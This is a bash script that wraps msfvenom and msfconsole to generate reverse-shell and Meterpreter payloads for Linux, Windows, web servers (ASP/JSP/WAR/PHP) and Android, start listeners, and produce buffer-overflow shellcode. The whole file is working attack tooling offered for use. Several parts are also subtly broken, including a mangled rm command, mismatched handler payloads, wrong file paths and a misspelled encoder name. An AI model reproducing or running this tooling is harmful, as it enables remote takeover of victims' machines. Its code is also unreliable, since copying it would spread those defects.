#!/bin/bash

if [ "$(id -u)" != "0" ] > /dev/null 2>&1; then
    echo -e '\e[0;31m【!!】 This script need root permission\e[0m' 1>&2
    exit
fi

dir=`pwd`

rm $dir/rm -rf handler
mkdir $dir/handler

bar ()
{
BAR='█║║║║║║║║║║║║║║║║║║║║║║║║║║║║║║║║║█'

for i in {1..35}; do
    echo -ne "\r${BAR:0:$i}"
    sleep 0.03
done
}

#check msfconsole 
which msfconsole > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
	msfconsole='1'
else
	msfconsole='0'
fi

#check msfvenom
which msfvenom > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
	msfvenom='1'
else
	msfvenom='0'
fi

#check netcat
which nc > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
	nc='1'
else
	nc='0'
fi

#~ #checking depenencies (msfconsole,msfvenom,netcat)
echo -n Check script dependencies = =;

sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done

if [ "$msfconsole" == "1" ] && [ "$msfvenom" == "1" ] && [ "$nc" == "1" ]
	then
		echo -en "\b【\e[1;33mPass\e[0m】"
		echo ""
		echo ""
		echo -e 'nc              【\e[1;33mOk\e[0m】'
   		echo -e 'msfconsole      【\e[1;33mOk\e[0m】'
		echo -e 'msfvenom        【\e[1;33mOk\e[0m】'
		echo ""
		sleep 2
fi
if [ "$msfconsole" == "0" ] && [ "$msfvenom" == "0" ] && [ "$nc" == "0" ]
	then
		fail='1'
		echo -en "\b \e[0;31m【Fail】\e[0m"
		echo ""
		echo ""
		exit
fi
echo "\e[5\e[1m\e[31
 __ __    ___  ____    ___   ___ ___       ____    ___  ____     ___  ____    ____  ______   ___   ____  
|  |  |  /  _]|    \  /   \ |   |   |     /    |  /  _]|    \   /  _]|    \  /    ||      | /   \ |    \ 
|  |  | /  [_ |  _  ||     || _   _ |    |   __| /  [_ |  _  | /  [_ |  D  )|  o  ||      ||     ||  D  )
|  |  ||    _]|  |  ||  O  ||  \_/  |    |  |  ||    _]|  |  ||    _]|    / |     ||_|  |_||  O  ||    / 
|  :  ||   [_ |  |  ||     ||   |   |    |  |_ ||   [_ |  |  ||   [_ |    \ |  _  |  |  |  |     ||    \ 
 \   / |     ||  |  ||     ||   |   |    |     ||     ||  |  ||     ||  .  \|  |  |  |  |  |     ||  .  /
  \_/  |_____||__|__| \___/ |___|___|    |___,_||_____||__|__||_____||__|\_||__|__|  |__|   \___/ |__|\_|                                                                                                      
\e[0"
echo "\e[35mCoded By: run3\e[0"

#start

echo -e "\e[34m[1]\e[35m Linux Based Payloads"
echo -e "\e[34m[2]\e[35m Windows Based Payloads"
echo -e "\e[34m[3]\e[35m Web Based Payload"
echo -e "\e[34m[4]\e[35m Android Based Payload"
echo -e	"\e[34m[5]\e[35m Buffer Overfows \e[0m"
echo ""

read -p "Choose What Number: " option

#Linux Based Payloads

if [ $option == 1 ]
	then
		echo -e "\e[34m[1]\e[35m Meterpreter Based"
		echo -e "\e[34m[2]\e[35m Non-Meterpreter Based\e[0m"
		read -p "Choose 1 or 2: " unix_option
		if [ $unix_option == 1 ]
			then
				read -p "Enter Your LHOST(own ip): " lhost
				read -p "Enter Your LPORT(Port You want to listen to): " lport
				read -p "Enter architecture (x86 or x64): " arch
				msfvenom -p linux/$arch/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f elf > shell-$arch.elf
				sleep 1
				echo -e "\e[31Payload Generated Sucessfully\e[0m"
				sleep 1
				read -p "Do you want to start a Meterpreter session?(Y or N): " start_meterpreter
				if [ $start_meterpreter == "Y" ] || [ $start_meterpreter == "y" ]
					then
						echo "use exploit/multi/handler" >> $dir/handler/handler.rc
						echo "set PAYLOAD linux/$arch/meterpreter/reverse_tcp" >> $dir/handler/handler.rc
						echo "set LHOST $lhost" >> $dir/handler/handler.rc
						echo "set LPORT $lport" >> $dir/handler/handler.rc
						echo "set EXITONSESSION false" >> $dir/handler/handler/handler.rc
						echo "exploit -j" >> $dir/handler/handler.rc
						/etc/init.d/postgresql start
						msfconsole -r  $dir/handler/handler.rc
				else
					exit
				fi
		fi
		if [ $unix_option == 2 ]
			then
				read -p "Enter Your LHOST(own ip): " lhost
				read -p "Enter Your LPORT(Port You want to listen to): " lport
				read -p "Enter architecture (x86 or x64): " arch
				msfvenom -p linux/$arch/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f elf > shell-$arch.elf
				sleep 1
				echo -e "\e[31Payload Generated Sucessfully\e[0m"
				sleep 1
				read -p "Do you want to start a netcat?(Y or N): " nc_start
				if [ $nc_start == "Y" ] || [ $nc_start== "y" ]
					then
						nc -lvvp $lport
				else
					exit
				fi
		fi		
fi

#Windows Based Payload

if [ $option == 2 ]
	then
		echo -e "\e[34m[1]\e[35m Meterpreter Based"
        echo -e "\e[34m[2]\e[35m Non-Meterpreter Based\e[0m"
		read -p "Choose 1 or 2: " windows_option
		if [ $windows_option == 1 ]
			then
				echo -e "\e[34m[1]\e[35m x86 (32 bit Payload)"
				echo -e "\e[34m[2]\e[35m x64 (64 bit Payload)\e[0m"
				read -p "What type of Architecture you want to use: " windows_arch
				if [ $windows_arch == 1 ]
					then
						read -p "Enter Your LHOST(own ip): " lhost
                        read -p "Enter Your LPORT(Port You want to listen to): " lport
						msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe > shell-x86.exe
						sleep 1
						echo -e "\e[31Payload Generated Sucessfully\e[0m"
						sleep 1
						read -p "Do you want to start a Meterpreter session?(Y or N): " start_meterpreter
		                if [ $start_meterpreter == "Y" ] || [ $start_meterpreter == "y" ]
                		    	then
                                	echo "use exploit/multi/handler" >> $dir/handler/handler.rc
                                    echo "set PAYLOAD linux/$arch/meterpreter/reverse_tcp" >> $dir/handler/handler.rc
		                            echo "set LHOST $lhost" >> $dir/handler/handler.rc
                		            echo "set LPORT $lport" >> $dir/handler/handler.rc
		                            echo "set EXITONSESSION false" >> $dir/handler/handler/handler.rc
		                            echo "exploit -j" >> $dir/handler/handler.rc
                		            /etc/init.d/postgresql start
		                            msfconsole -r  $dir/handler/handler.rc
                		else
                            		exit
                        fi
				fi
                if [ $windows_arch == 2 ]
                    then
                        read -p "Enter Your LHOST(own ip): " lhost
                        read -p "Enter Your LPORT(Port You want to listen to): " lport
                        msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe > shell-x64.exe
						sleep 1
						echo -e "\e[31Payload Generated Sucessfully\e[0m"
						sleep 1
                        read -p "Do you want to start a Meterpreter session?(Y or N): " start_meterpreter
                        if [ $start_meterpreter == "Y" ] || [ $start_meterpreter == "y" ]
                            then
                                echo "use exploit/multi/handler" >> $dir/handler/handler.rc
                            	echo "set PAYLOAD linux/$arch/meterpreter/reverse_tcp" >> $dir/handler/handler.rc
                                echo "set LHOST $lhost" >> $dir/handler/handler.rc
                                echo "set LPORT $lport" >> $dir/handler/handler.rc
                                echo "set EXITONSESSION false" >> $dir/handler/handler/handler.rc
                                echo "exploit -j" >> $dir/handler/handler.rc
                                /etc/init.d/postgresql start
                                msfconsole -r  $dir/handler/handler.rc
                        else
                                exit
                        fi
                fi
		fi
		if [ $windows_option == 2 ]
				then
					echo -e "\e[34m[1]\e[35m x86 (32 bit Payload)"
                	echo -e "\e[34m[2]\e[35m x64 (64 bit Payload)\e[0m"
                	read -p "What type of Architecture you want to use: " windows_arch
					if [ $windows_arch == 1 ]
						then
							read -p "Enter Your LHOST(own ip): " lhost
                        	read -p "Enter Your LPORT(Port You want to listen to): " lport
							msfvenom -p windows/shell/reverse_tcp LHOST=$lhost LPORT=$lport -f exe > shell-x86.exe
							sleep 1
							echo -e "\e[31Payload Generated Sucessfully\e[0m"
							sleep 1
							read -p "Do you want to start a netcat(Y or N): " nc_shell
							if [ $nc_shell == "Y" ] || [ $nc_shell == "y" ]
								then
									nc -lvp $lport
							else
								exit
							fi
				fi
				if [ $windows_arch == 2 ]
					then
						read -p "Enter Your LHOST(own ip): " lhost
                        read -p "Enter Your LPORT(Port You want to listen to): " lport
                        msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f exe > shell-x64.exe
						sleep 1
						echo -e "\e[31Payload Generated Sucessfully\e[0m"
						sleep 1
                        read -p "Do you want to start a netcat(Y or N): " nc_shell
                        if [ $nc_shell == "Y" ] || [ $nc_shell == "y" ]
                        	then
                                nc -lvp $lport
                        else
                                exit
                        fi
				fi
		fi
fi

#Web Based Payload
if [ $option == 3 ]
	then
		echo -e "\e[34m[1]\e[35m ASP reverse shell"
		echo -e "\e[34m[2]\e[35m JSP reverse shell"
		echo -e "\e[34m[3]\e[35m WAR reverse shell"
		echo -e "\e[34m[4]\e[35m PHP reverse shell\e[0m"
		read -p "What Type of Web reverse Shell do you want(numbers only): " web_shell
		if [ $web_shell == 1 ]
			then
				read -p "Enter Your LHOST(own ip): " lhost
                read -p "Enter Your LPORT(Port You want to listen to): " lport
				msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f asp > shell.asp
				sleep 1
				echo -e "\e[31Payload Generated Sucessfully\e[0m"
				sleep 1
				read -p "Do you want to start a Meterpreter session?(Y or N): " start_meterpreter
                if [ $start_meterpreter == "Y" ] || [ $start_meterpreter == "y" ]
                    then
                    	echo "use exploit/multi/handler" >> $dir/handler/handler.rc
                        echo "set PAYLOAD linux/$arch/meterpreter/reverse_tcp" >> $dir/handler/handler.rc
                        echo "set LHOST $lhost" >> $dir/handler/handler.rc
                    	echo "set LPORT $lport" >> $dir/handler/handler.rc
                        echo "set EXITONSESSION false" >> $dir/handler/handler/handler.rc
                        echo "exploit -j" >> $dir/handler/handler.rc
                        /etc/init.d/postgresql start
                        msfconsole -r  $dir/handler/handler.rc
                else
                        exit
                fi
		fi
		if [ $web_shell == 2 ]
			then
				read -p "Enter Your LHOST(own ip): " lhost
                read -p "Enter Your LPORT(Port You want to listen to): " lport
				msfvenom -p java/jsp_shell_reverse_tcp LHOST=$lhost LPORT=$lport -f raw > shell.jsp
				sleep 1
				echo -e "\e[31Payload Generated Sucessfully\e[0m"
				sleep 1
				read -p "Do you want to start a netcat(Y or N): " nc_shell
				if [ $nc_shell == "Y" ] || [ $nc_shell == "y" ]
					then
						nc -lvp $lport
				else
						exit
				fi
		fi		
		if [ $web_shell == 3 ]
			then
				read -p "Enter Your LHOST(own ip): " lhost
                read -p "Enter Your LPORT(Port You want to listen to): " lport
				msfvenom -p java/jsp_shell_reverse_tcp LHOST=$lhost LPORT=$lport -f war > shell.war
				sleep 1
				echo -e "\e[31Payload Generated Sucessfully\e[0m"
				sleep 1
				read -p "Do you want to start a netcat(Y or N): " nc_shell
				if [ $nc_shell == "Y" ] || [ $nc_shell == "y" ]
					then
						nc -lvp $lport
				else
						exit
				fi
		fi
		if [ $web_shell == 4 ]	
			then
				read -p "Enter Your LHOST(own ip): " lhost
                read -p "Enter Your LPORT(Port You want to listen to): " lport
				msfvenom -p php/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f raw > shell.php
				sleep 1
				echo -e "\e[31Payload Generated Sucessfully\e[0m"
				sleep 1
				read -p "Do you want to start a netcat(Y or N): " nc_shell
				if [ $nc_shell == "Y" ] || [ $nc_shell == "y" ]
					then
						nc -lvp $lport
				else
						exit
				fi
		fi		
fi

#Android Based Payload
if [ $option == 4 ]
	then
		read -p "Enter Your LHOST(own ip): " lhost
        read -p "Enter Your LPORT(Port You want to listen to): " lport
		read -p "What apk file name you want to generate: " data
		msfvenom –p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > $data.apk
		sleep 1
		echo -e "\e[31Payload Generated Sucessfully\e[0m"
		sleep 1
		read -p "Do you want to start a Meterpreter session?(Y or N): " start_meterpreter
    	if [ $start_meterpreter == "Y" ] || [ $start_meterpreter == "y" ]
            then
                echo "use exploit/multi/handler" >> $dir/handler/handler.rc
                echo "set PAYLOAD linux/$arch/meterpreter/reverse_tcp" >> $dir/handler/handler.rc
                echo "set LHOST $lhost" >> $dir/handler/handler.rc
                echo "set LPORT $lport" >> $dir/handler/handler.rc
                echo "set EXITONSESSION false" >> $dir/handler/handler/handler.rc
                echo "exploit -j" >> $dir/handler/handler.rc
                /etc/init.d/postgresql start
                msfconsole -r  $dir/handler/handler.rc
        else
                exit
        fi
fi 

#ShellCode Payload for Buffer overflow 
if [ $option == 5 ]
	then
		echo -e "\e[34m[1]\e[35m Check the Overflow Value"
		echo -e "\e[34m[2]\e[35m Create Pattern"
		echo -e "\e[34m[3]\e[35m Offset Checker"
		echo -e "\e[34m[4]\e[35m Generate A shellcode\e[0m"
		read -p "Enter the option you want to use: " buffer_option 
		if [ $buffer_option == 1 ]
			then
				read -p "Enter The IP you want to connect to: " ip
				read -p "Enter the port: " port
				echo "example Of the prefix (\e[31moverflow\e[0m + 'A' * 50 + '\r\n')"
				echo " if there is type it" 
				echo " if there is not leave it blank"
				read -p "Enter String the prefix:(The Red color) : " String
				$(python $dir/source/buf_check.py $ip $port $String)
		fi
		if [ $buffer_option == 2 ]
			then
				read -p "How many Random Character do you want to generate: "  rand_chars
				if [ ! -d "$dir/output" ]
					then
						mkdir output
						msf-pattern_create -l $rand_chars >> $dir/rand_chars.txt
				else		
						msf-pattern_create -l $rand_chars >> $dir/rand_chars.txt
				fi		
		fi		
		if [ buffer_option == 3 ]
			then
				read -p "How many Random Character did you generate: " rand_chars_generated
				read -p "What is the EIP Value after you send your random characters: " eip_val
				msf-pattern_offset -l $rand_chars_generated -q $eip_val
		fi
		if [ buffer_option == 4 ]
			then
				echo -e "\e[34m[1]\e[35m Windows"
				echo -e "\e[34m[2]\e[35m Linux"
				read -p "What Os you want to generate a shellcode: " shellcode_option
				if [ $shellcode_option == 1 ]
					then
						echo -e "\e[34m[1]\e[35m x86"
						echo -e "\e[34m[2]\e[35m x64"
						read -p "What is The Architecture:(Choose 1 or 2): " arch_windows_shellcode
						if [ $arch_windows_shellcode == 1 ]
							then
								read -p "Enter Your LHOST(own ip): " lhost
                				read -p "Enter Your LPORT(Port You want to listen to): " lport
								read -p "Enter The Bad Characters starting with \x00: " badchars
								msfvenom -p windows/meterpreter/reverse_tcp -b "$badchars" -f c -a x86 shikita_ga_nai
								sleep 2
								echo "Please use multi/handler to listen for the connection"	
       	 				fi			
						if [ $arch_windows_shellcode == 2 ]
							then
								read -p "Enter Your LHOST(own ip): " lhost
                				read -p "Enter Your LPORT(Port You want to listen to): " lport
								read -p "Enter The Bad Characters starting with \x00: " badchars
								msfvenom -p windows/x64/meterpreter/reverse_tcp -b "$badchars" -f python -a x64 shikita_ga_nai
								sleep 2
								echo "Please use multi/handler to listen for the connection"
						fi				
				fi
				if [ $shellcode_option == 2 ]
					then
						echo -e "\e[34m[1]\e[35m x86"
						echo -e "\e[34m[2]\e[35m x64"
						read -p "What is The Architecture:(Choose 1 or 2): " arch_linux_shellcode
						if [ $arch_linux_shellcode == 1 ]
							then
								read -p "Enter Your LHOST(own ip): " lhost
                				read -p "Enter Your LPORT(Port You want to listen to): " lport
								read -p "Enter The Bad Characters starting with \x00: " badchars
								msfvenom -p linux/x86/shell_reverse_tcp -b "$badchars" -f python -a x86 shikita_ga_nai
								sleep 2
								echo "Please use netcat to listen for the connection"	
						fi
						if [ $arch_linux_shellcode == 2 ]
							then
								read -p "Enter Your LHOST(own ip): " lhost
                				read -p "Enter Your LPORT(Port You want to listen to): " lport
								read -p "Enter The Bad Characters starting with \x00: " badchars
								msfvenom -p linux/x64/shell_reverse_tcp -b "$badchars" -f python -a x64 shikita_ga_nai
								sleep 2
								echo "Please use netcat to listen for the connection"	
						fi
				fi
		fi		
fi				
